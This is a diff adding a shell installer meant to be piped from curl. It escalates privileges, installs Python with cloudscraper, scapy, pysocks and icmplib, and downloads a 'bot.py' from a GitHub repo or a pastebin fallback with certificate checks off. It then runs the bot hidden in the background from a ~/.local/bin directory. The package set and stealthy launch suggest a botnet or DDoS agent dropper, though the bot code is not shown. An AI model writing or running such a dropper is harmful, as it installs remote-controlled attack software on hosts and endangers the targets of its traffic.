@@ -1,0 +1,237 @@
+#!/bin/sh
+# Universal installer script (curl | sh style) for many Linux distros and CPU architectures
+
+set +e
+log() { printf '[%s] %s\n' "$(date +'%Y-%m-%d %H:%M:%S')" "$1"; }
+
+# Detect architecture
+ARCH="$(uname -m 2>/dev/null || echo unknown)"
+log "Detected CPU architecture: $ARCH"
+
+# Detect if running as root
+is_root() { [ "$(id -u 2>/dev/null)" -eq 0 ]; }
+USE_SUDO=""
+if ! is_root; then
+    if command -v doas >/dev/null 2>&1; then
+        USE_SUDO="doas"
+    elif command -v sudo >/dev/null 2>&1; then
+        USE_SUDO="sudo"
+    elif command -v su >/dev/null 2>&1; then
+        USE_SUDO="su -c"
+        log "No sudo/doas: will use 'su -c' for privilege escalation"
+    else
+        log "Warning: No sudo/doas/su found. Some installs may fail."
+    fi
+fi
+
+# Wrapper to run commands as root if needed
+run_as_root() {
+    if [ -z "$USE_SUDO" ] || [ "$USE_SUDO" = "" ]; then
+        "$@"
+    elif [ "$USE_SUDO" = "su -c" ]; then
+        su -c "$*"
+    else
+        $USE_SUDO "$@"
+    fi
+}
+
+# Determine package manager via /etc/os-release (ID or ID_LIKE)
+PM_UPDATE=""
+PM_INSTALL=""
+if [ -r /etc/os-release ]; then
+    . /etc/os-release
+    case "$ID" in
+        ubuntu|debian|raspbian) 
+            PM_UPDATE="apt-get update -qq"
+            PM_INSTALL="apt-get install -y"
+            ;;
+        fedora)
+            PM_UPDATE="dnf -y check-update"
+            PM_INSTALL="dnf install -y"
+            ;;
+        centos|rhel)
+            PM_UPDATE=""
+            PM_INSTALL="yum install -y"
+            ;;
+        alpine)
+            PM_UPDATE="apk update"
+            PM_INSTALL="apk add --no-cache"
+            ;;
+        arch)
+            PM_UPDATE="pacman -Sy"
+            PM_INSTALL="pacman -S --noconfirm"
+            ;;
+        gentoo)
+            PM_UPDATE=""
+            PM_INSTALL="emerge --update --newuse"
+            ;;
+        opensuse*|suse)
+            PM_UPDATE="zypper refresh"
+            PM_INSTALL="zypper install -y"
+            ;;
+        *)
+            # fallback: try common managers
+            if command -v apt-get >/dev/null; then
+                PM_UPDATE="apt-get update -qq"
+                PM_INSTALL="apt-get install -y"
+            elif command -v yum >/dev/null; then
+                PM_INSTALL="yum install -y"
+            elif command -v dnf >/dev/null; then
+                PM_INSTALL="dnf install -y"
+            elif command -v apk >/dev/null; then
+                PM_INSTALL="apk add --no-cache"
+            elif command -v pacman >/dev/null; then
+                PM_INSTALL="pacman -S --noconfirm"
+            elif command -v opkg >/dev/null; then
+                PM_INSTALL="opkg update && opkg install"
+            else
+                PM_INSTALL=""
+            fi
+            ;;
+    esac
+fi
+
+# Prepare working directory
+BASE_DIR="${HOME:-/tmp}/.local/bin"
+WORK_DIR="$BASE_DIR/bot_$(date +%s)"
+mkdir -p "$WORK_DIR" 2>/dev/null || WORK_DIR="/tmp/bot_$(date +%s)"
+mkdir -p "$WORK_DIR" 2>/dev/null
+cd "$WORK_DIR" || exit 1
+
+# Function: find existing Python 3.6+
+find_python() {
+    for cmd in python3 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6 python; do
+        if command -v "$cmd" >/dev/null 2>&1; then
+            ver=$("$cmd" -c 'import sys; print(sys.version_info[:2])' 2>/dev/null)
+            major=$(echo $ver | awk -F',' '{print $1}' | tr -d ' ()')
+            minor=$(echo $ver | awk -F',' '{print $2}' | tr -d ' )')
+            if [ "$major" -ge 3 ] && [ "$minor" -ge 6 ]; then
+                PYTHON_CMD="$cmd"
+                return 0
+            fi
+        fi
+    done
+    return 1
+}
+
+# Function: install dependencies via package manager
+install_deps() {
+    if [ -z "$USE_SUDO" ] && ! is_root; then
+        log "Not running as root; limited installation of packages"
+        return 1
+    fi
+    if [ -z "$PM_INSTALL" ]; then
+        log "No known package manager; skipping automatic install"
+        return 1
+    fi
+    [ -n "$PM_UPDATE" ] && run_as_root sh -c "$PM_UPDATE" || true
+    run_as_root sh -c "$PM_INSTALL python3 python3-pip curl wget || true"
+}
+
+# Try to find Python, then install if missing
+find_python || { log "Python3 (>=3.6) not found, attempting package install..."; install_deps; }
+find_python || { log "Still no suitable Python; attempting pyenv installer..."; }
+
+# Try installing Python via pyenv if still missing
+if [ -z "$PYTHON_CMD" ] && ( is_root || [ -n "$USE_SUDO" ] ); then
+    if command -v curl >/dev/null 2>&1; then
+        curl -sLf https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | sh || true
+        export PATH="$HOME/.pyenv/bin:$PATH"
+        if command -v pyenv >/dev/null 2>&1; then
+            pyenv install -s 3.9.0 || pyenv install -s 3.8.0 || pyenv install -s 3.7.0 || true
+            PYTHON_CMD="$HOME/.pyenv/shims/python"
+        fi
+    fi
+fi
+
+# Final check for Python
+find_python || { log "No Python3 available. Exiting."; exit 1; }
+log "Using Python interpreter: $PYTHON_CMD"
+
+# Create virtual environment if possible
+if "$PYTHON_CMD" -m venv env 2>/dev/null; then
+    # shellcheck source=/dev/null
+    . env/bin/activate 2>/dev/null || true
+    log "Virtual environment created and activated."
+elif "$PYTHON_CMD" -m virtualenv env 2>/dev/null; then
+    . env/bin/activate 2>/dev/null || true
+    log "virtualenv created and activated."
+else
+    log "Could not create virtual environment; proceeding without it."
+fi
+
+# Ensure pip is available
+if "$PYTHON_CMD" -m pip --version >/dev/null 2>&1; then
+    PIP_CMD="$PYTHON_CMD -m pip"
+else
+    log "Bootstrapping pip using ensurepip..."
+    "$PYTHON_CMD" -m ensurepip --upgrade 2>/dev/null || true
+    PIP_CMD="$PYTHON_CMD -m pip"
+fi
+$PIP_CMD install --upgrade pip setuptools wheel 2>/dev/null || true
+
+# Install Python packages required by bot
+$PIP_CMD install cloudscraper requests pysocks scapy icmplib 2>/dev/null || true
+
+# Download utility with fallbacks
+download_file() {
+    url="$1"; dest="$2"
+    if command -v wget >/dev/null 2>&1; then
+        wget -q --no-check-certificate "$url" -O "$dest" && return 0
+    fi
+    if command -v curl >/dev/null 2>&1; then
+        curl -sSL --insecure "$url" -o "$dest" && return 0
+    fi
+    if command -v fetch >/dev/null 2>&1; then
+        fetch -q -o "$dest" "$url" && return 0
+    fi
+    if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
+        busybox wget -q -O "$dest" "$url" && return 0
+    fi
+    # Python fallback
+    if command -v "$PYTHON_CMD" >/dev/null 2>&1; then
+        "$PYTHON_CMD" - <<EOF
+import sys, urllib.request
+try:
+    urllib.request.urlretrieve("$url", "$dest")
+except Exception as e:
+    sys.exit(1)
+EOF
+        [ $? -eq 0 ] && return 0
+    fi
+    return 1
+}
+
+# Download the bot.py script
+BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
+download_file "$BOT_URL" "bot.py" \
+    || { log "Primary download failed, trying fallback URL"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "bot.py"; } \
+    || { log "All downloads failed"; exit 1; }
+
+chmod +x bot.py 2>/dev/null || true
+# Convert DOS newlines if needed
+if command -v dos2unix >/dev/null 2>&1; then
+    dos2unix bot.py 2>/dev/null || true
+else
+    tr -d '\r' < bot.py > bot.tmp && mv bot.tmp bot.py 2>/dev/null || true
+fi
+
+log "Starting bot in background..."
+# Start bot in background, redirect output to log
+if command -v nohup >/dev/null 2>&1; then
+    nohup "$PYTHON_CMD" bot.py > bot.log 2>&1 &
+elif command -v setsid >/dev/null 2>&1; then
+    setsid "$PYTHON_CMD" bot.py > bot.log 2>&1 &
+else
+    "$PYTHON_CMD" bot.py > bot.log 2>&1 &
+fi
+
+sleep 2
+# Check if bot.py process is running
+if ps ax 2>/dev/null | grep -v grep | grep "[b]ot.py" >/dev/null; then
+    log "Bot is running successfully (check $WORK_DIR/bot.log for output)."
+    echo "Installation completed successfully!"
+else
+    log "Bot may have failed to start. You can try: cd $WORK_DIR && $PYTHON_CMD bot.py"
+    exit 1
+fi
